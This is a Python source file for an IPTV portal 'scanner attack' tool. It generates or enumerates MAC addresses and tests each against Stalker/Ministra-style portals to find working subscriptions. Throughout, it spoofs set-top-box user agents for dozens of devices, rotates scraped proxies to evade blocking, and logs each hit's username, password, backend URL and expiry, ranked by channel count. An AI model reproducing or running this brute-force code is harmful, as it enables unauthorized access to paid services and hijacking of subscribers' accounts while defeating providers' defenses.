            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": True,
            "requires_metrics": True,
            "headers": {
                "X-User-Agent": "Model: MAG322; Link: WiFi",
            }
        },
        
        # Ministra Variants
        "ministra": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: MAG254; Link: Ethernet",
            }
        },
        
        # Infomir MAG Portals
        "infomir": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: MAG322; Link: WiFi",
            }
        },
        
        # Flussonic
        "flussonic": {
            "endpoint": "stalker_portal/server/load.php",
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: MAG250; Link: Ethernet",
            }
        },
        
        # TVIP
        "tvip": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.1.2; TVIP S-Box v.605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: TVIP S-Box v.605; Link: Ethernet",
            }
        },
        
        # Smart IPTV
        "smartiptv": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (SMART-TV; Linux; Tizen 4.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/56.0.2924.0 TV Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: SmartTV; Link: WiFi",
            }
        },
        
        # OTT Player
        "ottplayer": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 9; BRAVIA 4K VH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: OTT Player; Link: WiFi",
            }
        },
        
        # Additional Portal Types (from OpenBullet2)
        "aura_hd": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "formuler": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Formuler Z8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "dreambox": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Dreambox",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "enigma2": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Enigma2",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "zgemma": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Zgemma",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "vu_plus": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) VuPlus",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "octagon": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Octagon SF8008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "gigablue": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) GigaBlue",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "edision": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Edision OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "maxytec": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Maxytec",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "azbox": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) AZBox",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "openatv": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenATV",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "openpli": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenPLi",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "openvix": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenViX",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "openbox": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenBox",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "amiko": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Amiko A4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "ferguson": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Ferguson Ariva) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "strong": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Strong SRT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "technomate": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) TechnoMate",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "xtrend": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Xtrend",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "mutant": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Mutant",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "beyonwiz": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Beyonwiz",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "uclan": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Uclan Denys) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "spycat": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Spycat",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "axas": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Axas",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "dinobot": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Dinobot U5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "protek": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Protek",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "air_digital": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) AirDigital",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "wwio": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) WWIO",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "ebox": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Ebox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "miraclebox": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) MiracleBox",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "atemio": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Atemio",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "xp1000": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) XP1000",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "osmini": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSMini",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "osmio": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSMio",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "osninova": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSNinova",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "osmega": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSMega",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "edision_os": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Edision OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "iqon": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) iQon",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "ceryon": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Ceryon",
            "requires_signature": False,
            "requires_metrics": False,
        },
        "xpeed": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Xpeed",
            "requires_signature": False,
            "requires_metrics": False,
        },
    }
    
    return configs.get(portal_type, configs["stalker_v1"])


def create_scanner_state(portal_url, mode="random", mac_list=None, mac_range_start=None, mac_range_end=None, proxies=None, settings=None):
    """Create scanner attack state"""
    
    # Handle refresh mode: Load MACs from database for this portal
    if mode == "refresh":
        portal_norm = portal_url.rstrip('/').lower()
        found_macs = get_found_macs(portal=portal_url)
        mac_list = [m["mac"] for m in found_macs]
        logger.info(f"Refresh mode: {len(mac_list)} MACs loaded from database for portal {portal_url}")
    
    # Handle xscan mode: Generate MAC range
    elif mode == "xscan":
        if not mac_range_start or not mac_range_end:
            raise ValueError("xscan mode requires mac_range_start and mac_range_end")
        mac_list = generate_mac_range(mac_range_start, mac_range_end)
        logger.info(f"Xscan mode: {len(mac_list)} MACs generated from {mac_range_start} to {mac_range_end}")
    
    return {
        "id": secrets.token_hex(4),
        "running": True,
        "paused": False,
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "current_proxy": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "mode": mode,
        "mac_list": mac_list or [],
        "mac_list_index": 0,
        "scanned_macs": set(),
        "proxies": proxies or [],
        "settings": settings or {},
        # NEW: Performance Metrics
        "cpm": 0,  # Checks per Minute
        "eta_seconds": 0,  # Estimated Time to Arrival
        "hit_rate": 0.0,  # Hit Rate %
        "last_cpm_update": time.time(),
        "checks_since_last_update": 0,
        "quality_scores": [],  # List of quality scores for hits
    }


def add_scanner_log(state, message, level="info"):
    """Add log entry to scanner state"""
    ts = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({"time": ts, "level": level, "message": message})
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]


def calculate_cpm(state):
    """Calculate Checks Per Minute (CPM)"""
    current_time = time.time()
    time_diff = current_time - state.get("last_cpm_update", state["start_time"])
    
    if time_diff >= 10:  # Update every 10 seconds
        checks = state.get("checks_since_last_update", 0)
        if time_diff > 0:
            cpm = (checks / time_diff) * 60
            state["cpm"] = int(cpm)
        state["last_cpm_update"] = current_time
        state["checks_since_last_update"] = 0


def calculate_eta(state):
    """Calculate Estimated Time to Arrival (ETA) in seconds"""
    if state["mode"] in ("list", "refresh", "xscan"):
        total_macs = len(state["mac_list"])
        tested = state["tested"]
        remaining = total_macs - tested
        
        if remaining > 0 and state["cpm"] > 0:
            eta_minutes = remaining / state["cpm"]
            state["eta_seconds"] = int(eta_minutes * 60)
        else:
            state["eta_seconds"] = 0
    else:
        state["eta_seconds"] = 0  # Infinite for random mode


def calculate_hit_rate(state):
    """Calculate Hit Rate %"""
    if state["tested"] > 0:
        state["hit_rate"] = round((state["hits"] / state["tested"]) * 100, 2)
    else:
        state["hit_rate"] = 0.0


def calculate_quality_score(hit_data):
    """Calculate quality score for a hit (0-100)
    
    Factors:
    - Channels count (40 points max)
    - Has DE channels (20 points)
    - Expiry date (20 points)
    - Response time (10 points)
    - Portal type (10 points)
    """
    score = 0
    
    # Channels (40 points max)
    channels = hit_data.get("channels", 0)
    if channels >= 1000:
        score += 40
    elif channels >= 500:
        score += 30
    elif channels >= 100:
        score += 20
    elif channels >= 10:
        score += 10
    elif channels >= 1:
        score += 5
    
    # DE channels (20 points)
    if hit_data.get("has_de", False):
        score += 20
    
    # Expiry (20 points)
    expiry = hit_data.get("expiry", "")
    if expiry and expiry != "Unknown":
        try:
            # Try to parse expiry date
            if "day" in expiry.lower() or "tag" in expiry.lower():
                # Extract days from "X days" or "X Tage"
                import re
                days_match = re.search(r'(\d+)', expiry)
                if days_match:
                    days = int(days_match.group(1))
                    if days >= 365:
                        score += 20
                    elif days >= 180:
                        score += 15
                    elif days >= 90:
                        score += 10
                    elif days >= 30:
                        score += 5
            else:
                score += 10  # Has expiry but can't parse
        except:
            score += 5
    
    # Response time (10 points) - if available
    response_time = hit_data.get("response_time_ms", 0)
    if response_time > 0:
        if response_time < 1000:
            score += 10
        elif response_time < 3000:
            score += 7
        elif response_time < 5000:
            score += 5
        else:
            score += 2
    
    # Portal type (10 points)
    portal_type = hit_data.get("portal_type", "unknown")
    if portal_type.startswith("stalker"):
        score += 10
    elif portal_type in ("ministra", "infomir"):
        score += 8
    elif portal_type != "unknown":
        score += 5
    
    return min(score, 100)  # Cap at 100


def run_scanner_attack(attack_id):
    """Main scanner loop with full MacAttackWeb-NEW features"""
    with scanner_attacks_lock:
        if attack_id not in scanner_attacks:
            return
        state = scanner_attacks[attack_id]
    
    portal_url = state["portal_url"]
    mode = state["mode"]
    mac_list = state["mac_list"]
    proxies = state["proxies"]
    settings = state["settings"]
    
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = len(proxies) > 0
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    max_proxy_errors = settings.get("max_proxy_errors", 10)
    unlimited_retries = settings.get("unlimited_mac_retries", True)
    max_retries = settings.get("max_mac_retries", 3)
    max_proxy_attempts = settings.get("max_proxy_attempts_per_mac", 10)
    require_channels = settings.get("require_channels_for_valid_hit", True)
    min_channels = settings.get("min_channels_for_valid_hit", 1)
    
    add_scanner_log(state, f"Started: {speed} threads, mode={mode}", "info")
    
    # Log MAC list info for list/refresh/xscan modes
    if mode in ("list", "refresh", "xscan"):
        add_scanner_log(state, f"MAC list: {len(mac_list)} MACs to scan", "info")
    
    if use_proxies:
        add_scanner_log(state, f"Using {len(proxies)} proxies with smart rotation", "info")
        proxy_scorer.reset()
        proxy_scorer.reset_consecutive_fails()
    
    mac_index = 0
    retry_queue = []  # (mac, retry_count, last_proxy)
    list_done = False
    last_settings_reload = time.time()
    last_rehabilitation = time.time()
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}
        
        while state["running"]:
            # Handle pause
            while state["paused"] and state["running"]:
                time.sleep(0.5)
                if use_proxies:
                    if state.get("auto_paused"):
                        proxy_scorer.reset_consecutive_fails()
                        working = proxy_scorer.get_working_count(proxies, portal_url, max_proxy_errors)
                        if working > 0:
                            state["paused"] = False
                            state["auto_paused"] = False
                            add_scanner_log(state, f"Resumed - {working} proxies available", "info")
            
            if not state["running"]:
                break
            
            # Periodic proxy rehabilitation (every 3 minutes)
            if time.time() - last_rehabilitation > 180:
                if use_proxies and proxies:
                    rehabilitated = proxy_scorer.rehabilitate_dead_proxies()
                    if rehabilitated > 0:
                        add_scanner_log(state, f"♻️ Rehabilitated {rehabilitated} dead proxies", "info")
                last_rehabilitation = time.time()
            
            # Reload settings every 5 seconds
            if time.time() - last_settings_reload > 5:
                settings = get_scanner_settings()
                timeout = settings.get("timeout", 10)
                max_proxy_errors = settings.get("max_proxy_errors", 10)
                unlimited_retries = settings.get("unlimited_mac_retries", True)
                max_retries = settings.get("max_mac_retries", 3)
                max_proxy_attempts = settings.get("max_proxy_attempts_per_mac", 10)
                require_channels = settings.get("require_channels_for_valid_hit", True)
                min_channels = settings.get("min_channels_for_valid_hit", 1)
                last_settings_reload = time.time()
            
            # Update proxy stats
            if use_proxies:
                state["proxy_stats"] = proxy_scorer.get_stats(portal_url)
                state["proxy_stats"]["total_configured"] = len(proxies)
            
            # Check if list exhausted
            if mode in ("list", "refresh", "xscan") and mac_index >= len(mac_list) and not retry_queue:
                if not list_done:
                    add_scanner_log(state, f"List exhausted ({mac_index} MACs submitted)", "info")
                    list_done = True
                if not futures:
                    break
            
            # Check if proxies available
            if use_proxies:
                working_count = proxy_scorer.get_working_count(proxies, portal_url, max_proxy_errors)
                if working_count == 0 and not state.get("auto_paused"):
                    add_scanner_log(state, "⚠ No working proxies! Auto-pausing.", "warning")
                    state["paused"] = True
                    state["auto_paused"] = True
                    continue
            
            # Submit new MACs
            while len(futures) < speed and state["running"] and (not list_done or retry_queue):
                mac = None
                retry_count = 0
                last_proxy = None
                
                # Priority 1: Retry queue (soft-fail MACs)
                if retry_queue:
                    mac, retry_count, last_proxy = retry_queue.pop(0)
                # Priority 2: New MACs from list, refresh, or xscan
                elif mode in ("list", "refresh", "xscan") and mac_index < len(mac_list):
                    mac = mac_list[mac_index]
                    mac_index += 1
                    state["mac_list_index"] = mac_index
                # Priority 3: Random MACs
                elif mode == "random":
                    mac = generate_mac(mac_prefix)
                    attempts = 0
                    while mac in state["scanned_macs"] and attempts < 100:
                        mac = generate_mac(mac_prefix)
                        attempts += 1
                    state["scanned_macs"].add(mac)
                else:
                    break
                
                if not mac:
                    break
                
                # Get proxy
                proxy = None
                if use_proxies and proxies:
                    proxy = proxy_scorer.get_next_proxy(
                        proxies, portal_url, max_proxy_errors,
                        settings.get("proxy_rotation_percentage", 80)
                    )
                    
                    # Avoid same proxy that just failed
                    if proxy == last_proxy and len(proxies) > 1:
                        for attempt in range(min(10, len(proxies))):
                            alt = proxy_scorer.get_next_proxy(
                                proxies, portal_url, max_proxy_errors,
                                settings.get("proxy_rotation_percentage", 80)
                            )
                            if alt and alt != last_proxy:
                                proxy = alt
                                break
                    
                    if not proxy:
                        if mac not in [r[0] for r in retry_queue]:
                            retry_queue.append((mac, retry_count, None))
                        if not state.get("auto_paused"):
                            add_scanner_log(state, "⚠ No working proxies! Auto-pausing.", "warning")
                            state["paused"] = True
                            state["auto_paused"] = True
                        break
                    
                    state["current_proxy"] = proxy
                
                state["current_mac"] = mac
                
                future = executor.submit(
                    test_mac_scanner, portal_url, mac, proxy, timeout,
                    settings.get("proxy_connect_timeout", 2),
                    require_channels, min_channels
                )
                futures[future] = (mac, proxy, retry_count, time.time())
            
            # Process completed futures
            done = [f for f in futures if f.done()]
            
            for future in done:
                mac, proxy, retry_count, start_time = futures.pop(future)
                elapsed_ms = (time.time() - start_time) * 1000
                
                try:
                    success, result, error_type = future.result()
                    
                    # Update checks counter for CPM calculation
                    state["checks_since_last_update"] = state.get("checks_since_last_update", 0) + 1
                    
                    if success:
                        # HIT!
                        state["tested"] += 1
                        state["hits"] += 1
                        
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        
                        expiry = result.get("expiry", "Unknown")
                        channels = result.get("channels", 0)
                        genres = result.get("genres", [])
                        
                        de_genres = [g for g in genres if "DE" in g.upper() or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                        has_de = len(de_genres) > 0
                        
                        # Detect portal type from response
                        portal_type = detect_portal_type(portal_url, result.get("raw_response", ""))
                        
                        hit_data = {
                            "mac": mac,
                            "portal": portal_url,
                            "portal_type": portal_type,
                            "expiry": expiry,
                            "channels": channels,
                            "genres": genres,
                            "has_de": has_de,
                            "de_genres": de_genres,
                            "backend_url": result.get("backend_url"),
                            "username": result.get("username"),
                            "password": result.get("password"),
                            "max_connections": result.get("max_connections"),
                            "created_at": result.get("created_at"),
                            "client_ip": result.get("client_ip"),
                            "found_at": datetime.now().isoformat(),
                            "response_time_ms": int(elapsed_ms),
                        }
                        
                        # Calculate quality score for this hit
                        quality_score = calculate_quality_score(hit_data)
                        hit_data["quality_score"] = quality_score
                        state["quality_scores"] = state.get("quality_scores", [])
                        state["quality_scores"].append(quality_score)
                        
                        # Calculate average quality
                        if state["quality_scores"]:
                            state["avg_quality"] = sum(state["quality_scores"]) / len(state["quality_scores"])
                        
                        state["found_macs"].append(hit_data)
                        
                        # Save to persistent storage (batch write for performance)
                        batch_writer.add(hit_data)
                        
                        de_icon = " 🇩🇪" if has_de else ""
                        add_scanner_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon} - Q:{quality_score}", "success")
                        
                        # Update performance metrics
                        calculate_cpm(state)
                        calculate_eta(state)
                        calculate_hit_rate(state)
                    
                    elif error_type:
                        # Proxy error - retry MAC with different proxy
                        if proxy:
                            proxy_scorer.record_fail(proxy, error_type, portal_url)
                        
                        new_retry_count = retry_count + 1
                        
                        # Determine if we should retry
                        if unlimited_retries:
                            should_retry = True
                        else:
                            max_attempts = max(max_proxy_attempts, max_retries)
                            should_retry = new_retry_count < max_attempts
                        
                        if error_type == "dead":
                            add_scanner_log(state, f"💀 Proxy dead: {proxy}", "error")
                        elif error_type == "blocked":
                            add_scanner_log(state, f"🚫 Proxy blocked: {proxy}", "error")
                        elif error_type == "slow" and new_retry_count <= 2:
                            add_scanner_log(state, f"⏱ Timeout {mac}, retry queued", "warning")
                        
                        if should_retry:
                            # Limit retry queue size to prevent memory issues
                            if len(retry_queue) < MAX_RETRY_QUEUE_SIZE:
                                retry_queue.append((mac, new_retry_count, proxy))
                                if new_retry_count <= 3:
                                    add_scanner_log(state, f"🔄 Retry {new_retry_count}: {mac}", "warning")
                            else:
                                # Queue full - drop oldest entries
                                retry_queue.pop(0)
                                retry_queue.append((mac, new_retry_count, proxy))
                        else:
                            state["tested"] += 1
                            state["errors"] += 1
                            add_scanner_log(state, f"✗ {mac} - tried {new_retry_count} proxies, giving up", "error")
                    
                    else:
                        # Portal validation failed (invalid MAC or not enough channels)
                        state["tested"] += 1
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        
                        error_msg = result.get("error", "Invalid MAC")
                        if "channels" in error_msg.lower():
                            add_scanner_log(state, f"📺 {mac} - {error_msg}", "warning")
                
                except Exception as e:
                    state["errors"] += 1
                    new_retry_count = retry_count + 1
                    
                    if unlimited_retries:
                        should_retry = True
                    else:
                        max_attempts = max(max_proxy_attempts, max_retries)
                        should_retry = new_retry_count < max_attempts
                    
                    if should_retry:
                        # Limit retry queue size to prevent memory issues
                        if len(retry_queue) < MAX_RETRY_QUEUE_SIZE:
                            retry_queue.append((mac, new_retry_count, proxy))
                            if new_retry_count <= 3:
                                add_scanner_log(state, f"🔄 Retry {new_retry_count}: {mac} (worker error)", "warning")
                        else:
                            # Queue full - drop oldest entries
                            retry_queue.pop(0)
                            retry_queue.append((mac, new_retry_count, proxy))
                    else:
                        state["tested"] += 1
                        add_scanner_log(state, f"✗ {mac} - tried {new_retry_count} proxies, giving up", "error")
                    logger.error(f"Scanner worker error: {e}")
            
            time.sleep(0.02)
    
    state["running"] = False
    
    if use_proxies:
        stats = proxy_scorer.get_stats(portal_url)
        add_scanner_log(state, f"Proxy stats: {stats['active']} active, {stats['blocked']} blocked, {stats['dead']} dead", "info")
    
    add_scanner_log(state, f"✓ Done. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")


def test_mac_scanner(portal_url, mac, proxy, timeout, connect_timeout=2, require_channels=True, min_channels=1):
    """Test MAC with channel validation - uses optimized stb_scanner"""
    try:
        # Get compatible mode setting
        settings = get_scanner_settings()
        compatible_mode = settings.get("macattack_compatible_mode", False)
        
        # Use optimized stb_scanner.test_mac (3-Phase logic)
        success, result = stb_scanner.test_mac(
            portal_url, mac, proxy, timeout, connect_timeout, 
            require_channels, min_channels, compatible_mode
        )
        return success, result, None
            
    except stb_scanner.ProxyDeadError as e:
        logger.debug(f"Proxy dead: {e}")
        return False, {"mac": mac}, "dead"
    except stb_scanner.ProxySlowError as e:
        logger.debug(f"Proxy slow: {e}")
        return False, {"mac": mac}, "slow"
    except stb_scanner.ProxyBlockedError as e:
        logger.debug(f"Proxy blocked: {e}")
        return False, {"mac": mac}, "blocked"
    except Exception as e:
        logger.error(f"test_mac error: {e}")
        return False, {"mac": mac}, "unknown"


def generate_portal_name_from_hit(hit_data):
    """Generate portal name from hit data"""
    from urllib.parse import urlparse
    
    portal_url = hit_data.get("portal", "")
    channels = hit_data.get("channels", 0)
    has_de = hit_data.get("has_de", False)
    
    # Extract domain from URL
    domain = urlparse(portal_url).hostname or "Unknown"
    
    # Build name
    name = f"{domain}"
    if has_de:
        name += " 🇩🇪"
    name += f" ({channels}ch)"
    
    return name



# ============== PROXY MANAGEMENT ==============

def add_proxy_log(message, level="info"):
    """Add log entry to proxy state"""
    ts = datetime.now().strftime("%H:%M:%S")
    proxy_state["logs"].append({"time": ts, "level": level, "message": message})
    if len(proxy_state["logs"]) > 500:
        proxy_state["logs"] = proxy_state["logs"][-500:]


def fetch_proxies_worker():
    """Fetch proxies from configured sources"""
    import re
    import requests
    
    sources = scanner_data.get("proxy_sources", [])
    all_proxies = []
    
    add_proxy_log(f"Fetching from {len(sources)} sources...", "info")
    
    for source in sources:
        try:
            add_proxy_log(f"Fetching {source}", "info")
            resp = http_session.get(source, timeout=15)
            
            if "spys.me" in source:
                all_proxies.extend(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text))
            else:
                # Try HTML table
                matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", resp.text)
                if matches:
                    all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                else:
                    # Try prefixed
                    all_proxies.extend(re.findall(r"(?:socks[45]|http)://[^\s<>\"']+", resp.text, re.I))
                    # Try plain
                    all_proxies.extend(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text))
        except Exception as e:
            add_proxy_log(f"Error: {source} - {e}", "error")
    
    all_proxies = list(set(all_proxies))
    proxy_state["proxies"] = all_proxies
    add_proxy_log(f"Found {len(all_proxies)} unique proxies", "success")
    proxy_state["fetching"] = False


def test_proxies_worker(proxies_to_test):
    """Test proxies for connectivity"""
    import requests
    
    if not proxies_to_test:
        add_proxy_log("No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
